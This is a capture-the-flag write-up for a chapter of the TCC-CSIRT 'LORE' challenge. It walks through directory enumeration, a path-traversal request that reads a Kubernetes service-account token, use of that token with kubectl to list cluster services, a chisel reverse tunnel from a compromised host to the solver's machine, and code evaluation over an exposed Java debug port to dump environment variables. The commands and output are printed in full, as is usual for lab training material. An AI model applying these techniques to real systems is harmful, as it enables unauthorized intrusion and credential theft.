# Chapter 3: Bounded (5 points)

Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid
dreaming and even in your sleep, you encounter tricky problems? Help a
colleague solve tasks in the complex and interconnected world of LORE, where it
is challenging to distinguish reality from fantasy.

* The entry point to LORE is at http://intro.lore.tcc.

See you in the next incident!

## Hints

* Be sure you enter flag for correct chapter.
* In this realm, challenges should be conquered in a precise order, and to
  triumph over some, you'll need artifacts acquired from others - a unique
  twist that defies the norms of typical CTF challenges.
* All systems related to Chapter 3 restarts on failed healthcheck (5mins).

## Solution

```text
3 Bounded

A Travel bounds,
The Origin and the destination,
Anyway, it is cloud.
```

Chapter 3 link leads to http://jgames.lore.tcc/. We can use `dirb` to discover
some content on the server.

```console
$ dirb http://jgames.lore.tcc

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Oct 26 16:09:35 2024
URL_BASE: http://jgames.lore.tcc/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://jgames.lore.tcc/ ----
+ http://jgames.lore.tcc/css (CODE:302|SIZE:0)
+ http://jgames.lore.tcc/index.html (CODE:200|SIZE:2899)
+ http://jgames.lore.tcc/js (CODE:302|SIZE:0)
+ http://jgames.lore.tcc/manager (CODE:302|SIZE:0)
+ http://jgames.lore.tcc/sounds (CODE:302|SIZE:0)

-----------------
END_TIME: Sat Oct 26 16:10:20 2024
DOWNLOADED: 4612 - FOUND: 5
```

When we access the `/manager` endpoint we can see `403 Access Denied` page
rendered by `Tomcat`, which along with the name of this service indicates, that
we're dealing with a Java service.

Now it's time to utilise the servers from previous chapters.

After some exploration of `cgit` server from [Chapter 1: Travel] we can find
auto-mounted Kubernetes service ServiceAccount's API credentials stored in
`/var/run/secrets/kubernetes.io/serviceaccount/token`.

```console
$ curl 'http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token'
eyJhbGciOiJSUzI1NiIsImtpZCI6ImVVNVZ4TmlMdmFNaV9STFNBS3NvSnNwd0VmcUJYWkhfMGY2UGpwNDN3aTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYxNDg3MTMxLCJpYXQiOjE3Mjk5NTExMzEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjZ2l0IiwicG9kIjp7Im5hbWUiOiJjZ2l0LTZiNGI2YjU0OTYta3ZmODYiLCJ1aWQiOiJlOGIzZWVhMC1hMWM5LTQ3NzUtYTgwMy03YWMxYzI1NzY4NzEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiIzYzMzMWJhMS1jMjE2LTQ1MDMtOWY4NS1kZjMwZWE0MWMzZmYifSwid2FybmFmdGVyIjoxNzI5OTU0NzM4fSwibmJmIjoxNzI5OTUxMTMxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6Y2dpdDpkZWZhdWx0In0.CZXACcFlFXblMyv0KtyUSA-zvWLeW59T9eQ1wWV_UNUaQrFiw8TVV17Sw9FRuMAXDUm39RoRUfCLpbB34ELR_UC15DWsZGVp5UKpcrax0x17Qvz7zGUisrz1iQdRTWwvbHfjQXIDFTgqTq5cakgFGXc79B2oowTOIfHJugYIfgAJefqIdTnSJi9kTnMFda1W7a6BJp55RaDe4dEwkJQgIDrIv8kKt-rJBV0pkr3I0MKzpIX5DO1Z9kaIIbHAg40wZ4QUvo_H0OPUVkjvaD56u86sTQSCgb3aF-BKRdjgdOa5Pf3FeMmzLRXZ_E1Ne__k_Xj9kafhSiXczhGZEqdn0g
```

If we explore what other environment variables we retrieved along with the flag
on `pimpam` server from [Chapter 2: Origins], we'll find the Kubernetes API
address

```text
KUBERNETES_PORT=tcp://192.168.128.1:443
```

Since we already have an ability to execute commands on the `pimpam` host and
`kubectl` seems to be (conveniently) installed there, we can check what we can
do with the retieved token.

```console
$ kubectl auth can-i --list -s https://192.168.128.1 --insecure-skip-tls-verify --token eyJhbGciOiJSUzI1NiIsImtpZCI6ImVVNVZ4TmlMdmFNaV9STFNBS3NvSnNwd0VmcUJYWkhfMGY2UGpwNDN3aTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYxMTEyNTI3LCJpYXQiOjE3Mjk1NzY1MjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjZ2l0IiwicG9kIjp7Im5hbWUiOiJjZ2l0LTZiNGI2YjU0OTYta3ZmODYiLCJ1aWQiOiJlOGIzZWVhMC1hMWM5LTQ3NzUtYTgwMy03YWMxYzI1NzY4NzEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiIzYzMzMWJhMS1jMjE2LTQ1MDMtOWY4NS1kZjMwZWE0MWMzZmYifSwid2FybmFmdGVyIjoxNzI5NTgwMTM0fSwibmJmIjoxNzI5NTc2NTI3LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6Y2dpdDpkZWZhdWx0In0.rV0x9--b0E4lQ48-pXicrJiW3Ca71dxA6SGzjo2-W4tdTqX9h4Ma3kn86aK3auA4PZa5ICRLxLEsEcr1UwOV1TKj9TlCMjbVWp8ARnQMEDSJTbS_JebkW-FCBpe0fB8wexmbgJ99OlU-YIAgLRCfJnl6DD53o452Kb04ea34yXYrG-WeitWhB_UhczPhca8k-yD9Q5P6XDke5mgt8Rltpg7SJB2aWQw6T_-MtZOPiJXqzCjvPatPZ3J2PAzTZTtB7Syygn1gAOSyWFNwcnPRg1HL8ZQZyll7k3PqtGztT4a0OyJJdNgMwLfgEImeXjY1u3caA1mh5onLuPhWkxhbLQ
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
services                                        []                                     []               [list get]
```

We discover the capability of listing the services, so let's list the services
in all namespaces.

```console
$ kubectl get service -A -s https://192.168.128.1 --insecure-skip-tls-verify --token eyJhbGciOiJSUzI1NiIsImtpZCI6ImVVNVZ4TmlMdmFNaV9STFNBS3NvSnNwd0VmcUJYWkhfMGY2UGpwNDN3aTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYxMTEyNTI3LCJpYXQiOjE3Mjk1NzY1MjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjZ2l0IiwicG9kIjp7Im5hbWUiOiJjZ2l0LTZiNGI2YjU0OTYta3ZmODYiLCJ1aWQiOiJlOGIzZWVhMC1hMWM5LTQ3NzUtYTgwMy03YWMxYzI1NzY4NzEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiIzYzMzMWJhMS1jMjE2LTQ1MDMtOWY4NS1kZjMwZWE0MWMzZmYifSwid2FybmFmdGVyIjoxNzI5NTgwMTM0fSwibmJmIjoxNzI5NTc2NTI3LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6Y2dpdDpkZWZhdWx0In0.rV0x9--b0E4lQ48-pXicrJiW3Ca71dxA6SGzjo2-W4tdTqX9h4Ma3kn86aK3auA4PZa5ICRLxLEsEcr1UwOV1TKj9TlCMjbVWp8ARnQMEDSJTbS_JebkW-FCBpe0fB8wexmbgJ99OlU-YIAgLRCfJnl6DD53o452Kb04ea34yXYrG-WeitWhB_UhczPhca8k-yD9Q5P6XDke5mgt8Rltpg7SJB2aWQw6T_-MtZOPiJXqzCjvPatPZ3J2PAzTZTtB7Syygn1gAOSyWFNwcnPRg1HL8ZQZyll7k3PqtGztT4a0OyJJdNgMwLfgEImeXjY1u3caA1mh5onLuPhWkxhbLQ
NAMESPACE          NAME                                 TYPE           CLUSTER-IP        EXTERNAL-IP   PORT(S)                      AGE
calico-apiserver   calico-api                           ClusterIP      192.168.200.196   <none>        443/TCP                      61d
calico-system      calico-kube-controllers-metrics      ClusterIP      None              <none>        9094/TCP                     61d
calico-system      calico-typha                         ClusterIP      192.168.249.0     <none>        5473/TCP                     61d
cgit               cgit-web                             ClusterIP      192.168.134.179   <none>        80/TCP                       61d
default            kubernetes                           ClusterIP      192.168.128.1     <none>        443/TCP                      61d
default            whoami-service                       ClusterIP      192.168.144.8     <none>        80/TCP                       61d
ingress-nginx      ingress-nginx-controller             LoadBalancer   192.168.143.7     10.99.24.82   80:30820/TCP,443:32644/TCP   61d
ingress-nginx      ingress-nginx-controller-admission   ClusterIP      192.168.248.149   <none>        443/TCP                      61d
intro              intro-web                            ClusterIP      192.168.249.6     <none>        80/TCP                       61d
jgames             jgames-debug                         ClusterIP      192.168.183.255   <none>        5005/TCP                     61d
jgames             jgames-web                           ClusterIP      192.168.207.69    <none>        80/TCP                       61d
kube-system        kube-dns                             ClusterIP      192.168.128.10    <none>        53/UDP,53/TCP,9153/TCP       61d
metallb-system     webhook-service                      ClusterIP      192.168.224.62    <none>        443/TCP                      61d
pimpam             pimpam-db                            ClusterIP      192.168.167.76    <none>        3306/TCP                     61d
pimpam             pimpam-web                           ClusterIP      192.168.200.130   <none>        80/TCP                       61d
sam-operator       sam-web                              ClusterIP      192.168.142.180   <none>        80/TCP                       61d
```

The list shows that in addition to `jgames-web` there is also `jgames-debug`
service available which listens on port `5005` (i.e. default Java debugging
port). Unfortunately, this service does not seem to be exposed outside of the
cluster so we cannot access it directly.

Conveniently for us, the `pimpam` server also has `chisel` installed, which
can be used for reverse port forwarding, i.e. to open a tunnel from `pimpam`
to our workstation, opening a local listening port that can be routed anywhere
from the other (i.e. `pimpam`) end.

We can install `chisel` also locally on our end and start a server.

```console
$ chisel server --reverse --port 9876
2024/10/26 16:38:03 server: Reverse tunnelling enabled
2024/10/26 16:38:03 server: Fingerprint LE8mcn2YauFl//XLR0tpZ7QMqf4EWvXSNA9pXHF5K10=
2024/10/26 16:38:03 server: Listening on http://0.0.0.0:9876
```

Now we can run the corresponding client command on `pimpam` server to connect
to our locally-running server and open a listening port, that tunnels the
traffic to `jgames-debug` service using Kubernetes cluster-local DNS name of
`jgames-debug.jgames.svc.cluster.local`.


```console
$ chisel client <myip>:9876 R:5005:jgames-debug.jgames.svc.cluster.local:5005
```

When successful, we'll see the incoming connection in the server logs/console

```text
2024/10/26 16:41:44 server: session#1: Client version (1.9.1) differs from server version (1.10.1)
2024/10/26 16:41:44 server: session#1: tun: proxy#R:5005=>jgames-debug.jgames.svc.cluster.local:5005: Listening
```

In order to be able to execute/evaluete a Java function on the server, we need
to suspend some thread. Therefore we can add a breakpoint in `jdb` e.g. on
`ApplicationFilterChain.doFilter` which Tomcat calls when evaluating filters
when processing incoming request.

When we then navigate to `http://jgames.lore.tcc/manager` the breakpoint will
trigger and the corresponding handling thread will stop. Then we can evaluate
`java.lang.System.getenv()` to print environment variables.

The whole sequence looks like this
* attach a debugger
* add breakpoint
* navigate to `/manager` to trigger a breakpoint
* instruct `jdb` to evaluate/vall `java.lang.System.getenv()` which prints the
  environment variables of the current process

```console
$ jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=5005
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> stop in org.apache.catalina.core.ApplicationFilterChain.doFilter(jakarta.servlet.ServletRequest, jakarta.servlet.ServletResponse)
Set breakpoint org.apache.catalina.core.ApplicationFilterChain.doFilter(jakarta.servlet.ServletRequest, jakarta.servlet.ServletResponse)
>
Breakpoint hit: "thread=http-nio-8080-exec-3", org.apache.catalina.core.ApplicationFilterChain.doFilter(), line=119 bci=0

http-nio-8080-exec-3[1] print java.lang.System.getenv()
 java.lang.System.getenv() = "{FLAG=FLAG{ijBw-pfxY-Scgo-GJKO}, JGAMES_DEBUG_SERVICE_PORT_DEBUG=5005, SHLVL=0, LC_ALL=en_US.UTF-8, JGAMES_WEB_PORT_80_TCP_ADDR=192.168.207.69, JGAMES_DEBUG_SERVICE_HOST=192.168.183.255, JGAMES_DEBUG_SERVICE_PORT=5005, JGAMES_WEB_SERVICE_HOST=192.168.207.69, TOMCAT_MAJOR=10, KUBERNETES_SERVICE_PORT=443, JGAMES_WEB_PORT_80_TCP_PORT=80, HOME=/usr/local/tomcat, JGAMES_WEB_PORT=tcp://192.168.207.69:80, JGAMES_WEB_SERVICE_PORT=80, PATH=/usr/local/tomcat/bin:/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, JAVA_VERSION=jdk-21.0.4+7, KUBERNETES_PORT=tcp://192.168.128.1:443, JGAMES_DEBUG_PORT=tcp://192.168.183.255:5005, KUBERNETES_PORT_443_TCP=tcp://192.168.128.1:443, JGAMES_DEBUG_PORT_5005_TCP_ADDR=192.168.183.255, LANG=en_US.UTF-8, TOMCAT_SHA512=0a62e55c1ff9f8f04d7aff938764eac46c289eda888abf43de74a82ceb7d879e94a36ea3e5e46186bc231f07871fcc4c58f11e026f51d4487a473badb21e9355, JGAMES_DEBUG_PORT_5005_TCP=tcp://192.168.183.255:5005, KUBERNETES_SERVICE_HOST=192.168.128.1, LANGUAGE=en_US:en, GPG_KEYS=5C3C5F3E314C866292F359A8F3AD5C94A67F707E A9C5DF4D22E99998D9875A5110C01C5A2F6059E7, JAVA_HOME=/opt/java/openjdk, KUBERNETES_PORT_443_TCP_PROTO=tcp, JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005, JGAMES_WEB_PORT_80_TCP=tcp://192.168.207.69:80, CATALINA_HOME=/usr/local/tomcat, KUBERNETES_PORT_443_TCP_PORT=443, KUBERNETES_PORT_443_TCP_ADDR=192.168.128.1, JGAMES_WEB_PORT_80_TCP_PROTO=tcp, JGAMES_DEBUG_PORT_5005_TCP_PROTO=tcp, JGAMES_DEBUG_PORT_5005_TCP_PORT=5005, KUBERNETES_SERVICE_PORT_HTTPS=443, JGAMES_WEB_SERVICE_PORT_WEB=80, LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib, TOMCAT_VERSION=10.1.26, PWD=/usr/local/tomcat, TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib, HOSTNAME=jgames-759cf5bd55-pm4mn}"
```

We have successfully retrieved the FLAG. However, we're not donw with this host
as the ability to use `jdb` to run Java on `jgames` server will be essential in
[Chapter 4: Uncle].

[Chapter 1: Travel]: ../lore-1-travel
[Chapter 2: Origins]: ../lore-2-origins
[Chapter 4: Uncle]: ../lore-4-uncle
[chisel]: https://github.com/jpillora/chisel
